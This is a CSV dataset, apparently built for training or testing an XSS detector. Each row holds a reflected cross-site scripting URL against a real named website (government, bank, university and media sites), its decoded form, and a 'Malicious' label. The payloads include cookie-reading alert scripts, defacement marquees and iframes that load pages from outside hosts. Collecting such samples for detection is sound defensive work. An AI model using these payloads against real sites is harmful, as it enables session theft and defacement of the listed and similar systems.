Payloads,Class,decoded,executed,parser_changed
http://gabrieldedavid.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hidere<br>setbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert('no<br>rehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marq<br>uee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forociberna<br>utica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%<br>3c,Malicious,"http://gabrieldedavid.com/middletier/errorpage.asp?fatal=0&severity=3&category=3&eventid=3201&hideresetbtn=0&hidedetails=1&msg=>""><title>norehem was here</title><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://www.admin.cam.ac.uk/news/press/archive.cgi?display=&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,http://www.admin.cam.ac.uk/news/press/archive.cgi?display=<script>alert('xss')</script>,True,True
http://www.burstmedia.com/burstnetwork_advertiser/channels.asp?cat=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious,"http://www.burstmedia.com/burstnetwork_advertiser/channels.asp?cat=""><script>alert(""maxwel"")</script>",True,True
http://www.officemax.com/catalog/refill/inkntoner.jsp?brandid=rfbrand24&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.officemax.com/catalog/refill/inkntoner.jsp?brandid=rfbrand24""><script>alert(1);</script>",True,True
http://yotoshi.com/?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;category=<br>on&amp;order=0,Malicious,"http://yotoshi.com/?keyword=""><script>alert(document.cookie);</script>&category=on&order=0",True,True
<script> alert(document.cookie); </script>,Malicious,<script> alert(document.cookie); </script>,True,True
http://www.attijaribank.com.tn/attijari/site/viewarticle.jsp?id=%60%27%22%22%22%3e%3cscript%3ealert%<br>28%27xss%27%29;%3c/script%3e,Malicious,"http://www.attijaribank.com.tn/attijari/site/viewarticle.jsp?id=`'""""""><script>alert('xss');</script>",True,True
https://developer.mozilla.org/index.php?title=en&amp;revision=224%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"https://developer.mozilla.org/index.php?title=en&revision=224'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.marchofdimes.com/prematurity/b.asp?band_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.marchofdimes.com/prematurity/b.asp?band_id=""><script>alert(""maxwel"")</script>",True,True
http://www.journalchretien.net/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20<br>rat')%3c/script%3e,Malicious,"http://www.journalchretien.net/spip.php?action=cookie&url=java:""/<script>alert('hello the rat')</script>",True,True
http://www.trafik.gov.tr/arama/arama.asp?search=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.trafik.gov.tr/arama/arama.asp?search=''></script><script>alert(document.cookie)</script>,True,True
http://www.olusumgazetesi.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.olusumgazetesi.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://www.placedelamode.com/search.php?q=%22%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e,Malicious,"http://www.placedelamode.com/search.php?q=""><script>alert('xss')</script>",True,True
http://style.misgeret.co.il/sharond/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,http://style.misgeret.co.il/sharond/search.php?q=<script>alert(document.cookie)</script>,True,True
"http://drug-accutane.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious,"http://drug-accutane.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",True,True
http://www.akuta.ed.jp/cgi/form.cgi?type=1&amp;%8e%99%93%b6%81e%90%b6%93k%8e%81%96%bc=&amp;%8e%99%93%b6%81e%<br>90%b6%93k%82%a9%82%c8=&amp;%8aw%8dz%96%bc=&amp;%8aw%94n=&amp;%95%db%8c%ec%8e%d2%8e%81%96%bc=&amp;%95%db%8c%ec%8e%d2%<br>82%a9%82%c8=&amp;%97x%95%d6%94%d4%8d%86=&amp;%8fz%8f%8a=&amp;%93d%98b%94%d4%8d%86=&amp;fax%94%d4%8d%86=&amp;%83%81%81%5b<br>%83%8b%83a%83h%83%8c%83x=&amp;%82%b2%88%d3%8c%a9%81e%82%a8%96%e2%82%a2%8d%87%82%b9=%3cscript%3ealert%28%<br>22xss+by+kusomiso.com%22%29%3c%2fscript%3e%0d%0a,Malicious,"http://www.akuta.ed.jp/cgi/form.cgi?type=1&�����e���k����=&�����e���k����=&�w�z��=&�w�n=&�ی�Ҏ���=&�ی�҂���=&�x�֔ԍ�=&�z��=&�d�b�ԍ�=&fax�ԍ�=&���[���a�h���x=&���ӌ��e���₢����=<script>alert(""xss by kusomiso.com"")</script>
",True,True
http://texas.rangers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious,http://texas.rangers.mlb.com/media/video.jsp?mid=<script>alert('pappy was here');</script>,True,True
http://www.leadingedgesafaris.com/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;,Malicious,"http://www.leadingedgesafaris.com/webcards/tools/calendar.php?month=""><script>alert(document.cookie)</script>",True,True
http://kiosque-eco.credit-agricole.fr/site/page.php?pag_id=87%22%3e%3cscript%3ealert(/xss/.source)%3<br>c/script%3e,Malicious,"http://kiosque-eco.credit-agricole.fr/site/page.php?pag_id=87""><script>alert(/xss/.source)</script>",True,True
http://www.sega.fr/games/?searchplatform=&amp;searchgenre=&amp;searchgame=%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(1337)%3c/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/marquee%3e%3c/h1%3e,Malicious,"http://www.sega.fr/games/?searchplatform=&searchgenre=&searchgame='""></title><script>alert(1337)</script><h1><marquee>xss by xylitol</marquee></h1>",True,True
http://messageboards.aol.com/aol/en_us/articles.php?boardid=544978&amp;func=3%22%3e%3cscript%3ealert(/xs<br>s/.source)%3c/script%3e&amp;channel=people+connection,Malicious,"http://messageboards.aol.com/aol/en_us/articles.php?boardid=544978&func=3""><script>alert(/xss/.source)</script>&channel=people connection",True,True
http://www.leggo.it/articolo.php?id=60178%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e#,Malicious,"http://www.leggo.it/articolo.php?id=60178""><script>alert(document.cookie)</script>#",True,True
http://www.savsak.com/service/whois.php?domain=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;tld=com&amp;looku<br>p=sorgula%3e%3e,Malicious,"http://www.savsak.com/service/whois.php?domain=""><script>alert(1)</script>&tld=com&lookup=sorgula>>",True,True
http://www.ajans53.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.ajans53.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://www.clicrbs.com.br/rbstv/jsp/default.jsp?programa=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.clicrbs.com.br/rbstv/jsp/default.jsp?programa=""><script>alert(""maxwel"")</script>",True,True
http://www.russas.ce.gov.br/phpinfo.php?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3cscript%3eale<br>rt(document.cookie)%3c/script%3e,Malicious,"http://www.russas.ce.gov.br/phpinfo.php?cx[][][][][][][][][][][][][][][][][][]=""><script>alert(document.cookie)</script>",True,True
http://www.8notes.com/directory/s.asp?keyword=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.8notes.com/directory/s.asp?keyword=""><script>alert(""maxwel"")</script>",True,True
http://www.dailynorthwestern.com/media/storage/paper853/news/2005/11/21/campus/profs.help.nasa.searc<br>h.moon.for.oxygen.sources.including.ice-1920175.shtml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.dailynorthwestern.com/media/storage/paper853/news/2005/11/21/campus/profs.help.nasa.search.moon.for.oxygen.sources.including.ice-1920175.shtml'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.cinema.nl/trefwoorden/trefwoord?tag=indianen-drama&amp;tag=soft-porno%22%3e%3cscript%3ealert(<br>document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.cinema.nl/trefwoorden/trefwoord?tag=indianen-drama&tag=soft-porno""><script>alert(document.cookie)</script>'""><marquee><h1>hhhhh</h1></marquee>",True,True
http://busca.uol.com.br/www/index.html?ref=homeuol&amp;q=&lt;script&gt;alert(&quot;xroot owned you!&quot;)&lt;/script&gt;,Malicious,"http://busca.uol.com.br/www/index.html?ref=homeuol&q=<script>alert(""xroot owned you!"")</script>",True,True
http://www.diub.de/script/golink.php?id=www.xssed.com&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.diub.de/script/golink.php?id=www.xssed.com""><script>alert(1)</script>",True,True
http://jenerik.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://jenerik.net/directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://helpdesk.asus.com/biosorder/store/aci_message.asp?message=no+items+to+display%2e'%3cscript%3e<br>alert('agd_scorp')%3c/script%3e,Malicious,http://helpdesk.asus.com/biosorder/store/aci_message.asp?message=no items to display.'<script>alert('agd_scorp')</script>,True,True
http://www.act.by/ru/pages/index.php?id=32&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.act.by/ru/pages/index.php?id=32""><script>alert(document.cookie)</script>",True,True
http://www.akamai.fr/enfr/html/awe/login.html?campaign_id=%22%3ebusindre%3cscript%3ealert(document.c<br>ookie)%3c/script%3e&amp;curl=/enes/dl/whitepapers/how_will_the_internet_scale.pdf,Malicious,"http://www.akamai.fr/enfr/html/awe/login.html?campaign_id="">busindre<script>alert(document.cookie)</script>&curl=/enes/dl/whitepapers/how_will_the_internet_scale.pdf",True,True
http://www.ddlvista.com/search.php?qry=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_omeha/);%3c/sc<br>ript%3e,Malicious,"http://www.ddlvista.com/search.php?qry=""></script><script>alert(/xssed_by_omeha/);</script>",True,True
http://www.keywordspy.com.br/overview/domain.aspx?q=dcbbizz.com/out.php?id=%22%3e%3cscript%3ealert(%27illuz1on@r00tdefaced.net%27)%3c/script%3e,Malicious,"http://www.keywordspy.com.br/overview/domain.aspx?q=dcbbizz.com/out.php?id=""><script>alert('illuz1on@r00tdefaced.net')</script>",True,True
http://ms165.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms165.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.e.gov.qa/egovportal/visaservice/visaservicedetails.jsp?serviceportal=%3c%2fscript%3e%3csc<br>ript%3ealert%28%22noph0bia%22%29%3c%2fscript%3e,Malicious,"http://www.e.gov.qa/egovportal/visaservice/visaservicedetails.jsp?serviceportal=</script><script>alert(""noph0bia"")</script>",True,True
http://photofile.ru/search/photos/?search=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://photofile.ru/search/photos/?search=""><script>alert(document.cookie)</script>",True,True
http://www.adquest3d.com/adquest20/search.asp?brd=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.adquest3d.com/adquest20/search.asp?brd=""><script>alert(""maxwel"")</script>",True,True
http://mobil.sf.se/intro.php?qik=&quot;&gt;'&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://mobil.sf.se/intro.php?qik="">'><script>alert(123)</script>",True,True
http://arama.cafemola.org/ara.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://arama.cafemola.org/ara.php?q=""><script>alert(document.cookie)</script>",True,True
http://www.simonsig.co.za/about.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.simonsig.co.za/about.php?id=""><script>alert(document.cookie)</script>",True,True
http://icnorthwales.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.o<br>rg/)%3c/script%3e%3cp,Malicious,"http://icnorthwales.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
http://www.speedy.com.ar/terabox/index.php?section=terminos%27%22%3e%3c/script%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious,"http://www.speedy.com.ar/terabox/index.php?section=terminos'""></script><script>alert(/xss/)</script>",True,True
http://www.fucz.gov.ba/fucz/bosanski/novosti/img_prikaz.php?img=1_mart&amp;img_title=%3cscript%3ealert%2<br>8document.cookie%29%3c/script%3e,Malicious,http://www.fucz.gov.ba/fucz/bosanski/novosti/img_prikaz.php?img=1_mart&img_title=<script>alert(document.cookie)</script>,True,True
http://www.takealot.com/gaming/browse?&amp;qsearch=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e,Malicious,"http://www.takealot.com/gaming/browse?&qsearch=""><script>alert(document.cookie)</script>",True,True
"http://www-angler.larc.nasa.gov/cgi-bin/site/showdoc?mnemonic=%3cscript%3ealert(%22xss%20with%20musi<br>c%20by%20sony%22)%3c/script%3e%3cscript%3ealert(%22insecurity%20romania%22)%3c/script%3e%3cscript%3e<br>alert(%22presented%20singing%20nasa,applause!%22)%3c/script%3e%3ciframe%20src%20=http://www.youtube.<br>com/watch?v=9hmry8jysdg%22%20width=%220%22%20height=%220%22%20\%3e%3c/div%3e%22%3e",Malicious,"http://www-angler.larc.nasa.gov/cgi-bin/site/showdoc?mnemonic=<script>alert(""xss with music by sony"")</script><script>alert(""insecurity romania"")</script><script>alert(""presented singing nasa,applause!"")</script><iframe src =http://www.youtube.com/watch?v=9hmry8jysdg"" width=""0"" height=""0"" \></div>"">",True,True
http://www.europarl.europa.eu/sides/getdoc.do?pubref=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.europarl.europa.eu/sides/getdoc.do?pubref=""><script>alert(""maxwel"")</script>",True,True
http://www.torrentspy.com/uploadtorrent.asp?tn=asdf%22%3e%3cscript%3ealert('xss')%3c/script%3e%3c%22<br>&amp;lngmaincat=&amp;lngsubcat=&amp;ts=,Malicious,"http://www.torrentspy.com/uploadtorrent.asp?tn=asdf""><script>alert('xss')</script><""&lngmaincat=&lngsubcat=&ts=",True,True
http://www.vteb.gov.lv/index.php?lng=en&amp;tpc=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious,"http://www.vteb.gov.lv/index.php?lng=en&tpc=""><script>alert(/xssed/);</script>",True,True
http://icloughborough.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced<br>.org/)%3c/script%3e%3cp,Malicious,"http://icloughborough.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
http://adspecs.yahoo.co.uk/search?q=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e&addr=&hs=1&lat=&lon=&locac=0,Malicious,"http://adspecs.yahoo.co.uk/search?q= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss3d by hari(topsecure.net)</h1></marquee>&addr=&hs=1&lat=&lon=&locac=0",True,True
http://www.turkzeka.com/zeka/arsiv.asp?baslik=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.turkzeka.com/zeka/arsiv.asp?baslik=""><script>alert(document.cookie)</script>",True,True
http://www.gapep.gov.tr/search.php?searchkeys=%3cscript%3ealert%283414208%29%3c%2fscript%3e&amp;lang=tr&amp;<br>arastir=arast%c4%b1r,Malicious,http://www.gapep.gov.tr/search.php?searchkeys=<script>alert(3414208)</script>&lang=tr&arastir=arastır,True,True
http://www.taksitpazar.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.taksitpazar.com/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
http://www.darkfate.co.uk/main-register.php?ref=&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,http://www.darkfate.co.uk/main-register.php?ref=<script>alert(1);</script>,True,True
http://www.warf.ws/about/index.jsp?cid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.warf.ws/about/index.jsp?cid=""><script>alert(""maxwel"")</script>",True,True
http://www.talkingbooks.co.uk/ttbs/search.asp?tag=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.talkingbooks.co.uk/ttbs/search.asp?tag=""><script>alert(""maxwel"")</script>",True,True
http://www.sat.or.th/ussa/up_pic/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.sat.or.th/ussa/up_pic/folderview.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://xchjcy.gov.cn/shownews.asp?id=138}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%<br>3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://xchjcy.gov.cn/shownews.asp?id=138}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.sehitlerolmez.com/ekart_resimci.php?resim=%22%3e%3cscript%3ealert(%22asker+vurulunca+degi<br>l+vurulunca+olur%22)%3c/script%3e,Malicious,"http://www.sehitlerolmez.com/ekart_resimci.php?resim=""><script>alert(""asker vurulunca degil vurulunca olur"")</script>",True,True
http://www.gophaber.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.gophaber.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://www.justice.tas.gov.au/bdm/home/bdm_search_page?x=0&amp;y=0&amp;queries_description_query=%22%3e%3csc<br>ript%3ealert%28123%29%3c%2fscript%3e&amp;search_page_16663_submit_button=submit&amp;current_result_page=0&amp;re<br>sults_per_page=10&amp;submitted_search_category=%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;mode=results,Malicious,"http://www.justice.tas.gov.au/bdm/home/bdm_search_page?x=0&y=0&queries_description_query=""><script>alert(123)</script>&search_page_16663_submit_button=submit¤t_result_page=0&results_per_page=10&submitted_search_category=""><script>alert(123)</script>&mode=results",True,True
http://www.worksite.govt.nz/redirect/%3cmarquee%3edefaced_by_ironzorg%3c/marquee%3e;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious,"http://www.worksite.govt.nz/redirect/<marquee>defaced_by_ironzorg</marquee>;msg=<script>alert(""xssbydt"")</script>",True,True
http://showing.com/search/videos/?s=%22%3e%3cscript%3ealert(%27xssed%27)%3c/script%3e,Malicious,"http://showing.com/search/videos/?s=""><script>alert('xssed')</script>",True,True
http://www.sahpa.co.za/sahpa/news.jsp?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.sahpa.co.za/sahpa/news.jsp?section=""><script>alert(""maxwel"")</script>",True,True
http://ev12.evenue.net/cgi-bin/ncommerce3/segeteventlist?groupcode=fig&amp;linkid=uwash&amp;shoppercontext=%<br>22%3e%3cscript%3ealert%28document%2ecookie%29%3c%2fscript%3e&amp;caller=&amp;appcode=,Malicious,"http://ev12.evenue.net/cgi-bin/ncommerce3/segeteventlist?groupcode=fig&linkid=uwash&shoppercontext=""><script>alert(document.cookie)</script>&caller=&appcode=",True,True
https://www.nacha.org/member-apps/index.cfm?action=login.form&amp;error=1&amp;loginredirect=%22%3e%3ciframe%<br>20src=%22javascript:alert%28%27xss%27%29;%22%3e%3c/iframe%3e,Malicious,"https://www.nacha.org/member-apps/index.cfm?action=login.form&error=1&loginredirect=""><iframe src=""javascript:alert('xss');""></iframe>",True,True
